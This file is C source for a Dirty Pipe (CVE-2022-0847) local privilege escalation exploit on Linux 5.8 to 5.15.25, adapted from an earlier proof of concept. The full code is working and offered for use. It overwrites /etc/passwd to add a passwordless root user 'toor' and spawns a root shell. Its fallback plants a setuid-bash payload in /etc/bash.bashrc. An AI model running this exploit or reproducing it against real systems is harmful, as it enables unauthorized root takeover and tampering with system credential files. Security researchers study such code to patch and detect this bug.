/*
Exploit Title: Linux Kernel 5.8 < 5.15.25 - Local Privilege Escalation (DirtyPipe 2)
Exploit Author: Antonius (w1sdom)
github : https://github.com/bluedragonsecurity
web : https://www.bluedragonsec.com

tested on :
- linux kernel 5.13.0-21-generic (compiled on lubuntu 20.04.5)
- linux lubuntu 20.04.2 - linux kernel 5.8

Original Author: Max Kellermann (max.kellermann@ionos.com)
CVE: CVE-2022-0847

 * Copyright 2022 CM4all GmbH / IONOS SE
 *
 * author: Max Kellermann <max.kellermann@ionos.com>
 *
 * Proof-of-concept exploit for the Dirty Pipe
 * vulnerability (CVE-2022-0847) caused by an uninitialized
 * "pipe_buffer.flags" variable.  It demonstrates how to overwrite any
 * file contents in the page cache, even if the file is not permitted
 * to be written, immutable or on a read-only mount.
 *
 * This exploit requires Linux 5.8 or later; the code path was made
 * reachable by commit f6dd975583bd ("pipe: merge
 * anon_pipe_buf*_ops").  The commit did not introduce the bug, it was
 * there before, it just provided an easy way to exploit it.
 *
 * There are two major limitations of this exploit: the offset cannot
 * be on a page boundary (it needs to write one byte before the offset
 * to add a reference to this page to the pipe), and the write cannot
 * cross a page boundary.
 *
 * Example: ./write_anything /root/.ssh/authorized_keys 1 $'\nssh-ed25519 AAA......\n'
 *
 * Further explanation: https://dirtypipe.cm4all.com/
*/
#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/utsname.h>
#include <ctype.h>

int validate_kernv() {
    struct utsname buffer;
    int major, minor, patch;
    int is_vulnerable = 0;
    char *version_str;
    int len, compile_year;

    if (uname(&buffer) != 0) {
        perror("uname");
        return 1;
    }
    version_str = buffer.version;
    len = strlen(version_str);
    compile_year = 0;
    for (int i = len - 4; i >= 0; i--) {
        if (isdigit(version_str[i]) && isdigit(version_str[i+1]) && 
            isdigit(version_str[i+2]) && isdigit(version_str[i+3])) {
            compile_year = atoi(&version_str[i]);
            break;
        }
    }
    if (compile_year < 2023) {
        is_vulnerable = 1;
    }
    int fields = sscanf(buffer.release, "%d.%d.%d", &major, &minor, &patch);
    if (fields < 3) patch = 0;
    if (major == 5) {
        if (minor >= 8 && minor <= 14) {
            is_vulnerable = 1;
        }
        else if (minor == 15 && patch < 25) {
            is_vulnerable = 1;
        }
    }
    else {
        printf("[-] kernel is not vulnerable !!! quitting ...");
        exit(-1);
    }
    
    if (is_vulnerable) {
    	printf("[*] kernel is vulnerable\n");
   	}
    else {
    	printf("[-] kernel is not vulnerable !!! quitting ...");
        exit(-1);
    }

    return 0;
}

void prepare_pipe(int p[2]) {
    pipe(p);
    int capacity = fcntl(p[1], 1032);
    static char dummy[4096];
    for (int r = capacity; r > 0; ) {
        int n = r > sizeof(dummy) ? sizeof(dummy) : r;
        write(p[1], dummy, n);
        r -= n;
    }
    for (int r = capacity; r > 0; ) {
        int n = r > sizeof(dummy) ? sizeof(dummy) : r;
        read(p[0], dummy, n);
        r -= n;
    }
}

int inject_payload(char *target, char *payload) {
    int fd = open(target, O_RDONLY);
    int p[2];
    __off64_t offset = 1; 

    prepare_pipe(p);
    fd = open(target, O_RDONLY);
    if (fd < 0) return 1;
    if (splice(fd, &offset, p[1], NULL, 1, 0) < 0) {
        perror("[-] splice failed");
        return 0;
    }
    printf("[*] injecting payload to %s\n", target);
    write(p[1], payload, strlen(payload));

    return 1;
}

void bashrc() {
    char *target = "/etc/bash.bashrc";
    char *payload = "\ncp /bin/bash /tmp/x; chmod +s /tmp/x\n#";
    if (inject_payload(target, payload) == 0) {
        printf("[-] failed to inject payload !");
    }
    else {
   		printf("[*] payload injected to %s\n", target);
    	printf("[*] you need to wait for root to login\n");
    	printf("[*] once the root logged in you will get suid shell on /tmp/x\n");
    	printf("[*] get root by : /tmp/x -p\n");
    }
}

int toor_check() {
    FILE *fp;
    char path[1035];

    fp = popen("su toor -c id", "r");
    if (fp == NULL) {
        return 0;
    }
    if (fgets(path, sizeof(path), fp) != NULL) {
        if (strstr(path, "root")) {
            return 1;
        } 
    }
    pclose(fp);

    return 0;
}

int passwd() {
    char *target = "/etc/passwd";
    char *payload = "\ntoor::0:0:root:/root:/bin/bash\n#";
    
    system("cp /etc/passwd /tmp/passwd.bak");
    if (inject_payload(target, payload) == 0) {
        printf("[-] failed to inject payload !");
    }
	if (toor_check() == 1) {
        printf("[+] exploitation success, getting root for you.\n");
        system("su toor");
    }
    else {
        printf("[-] failed on method 1, testing method 2\n");  
        return 0;      
    }

    return 1;
}

int main() {
    validate_kernv();
    if (passwd() == 0) {
        bashrc(); 
    }

    return 0;
}
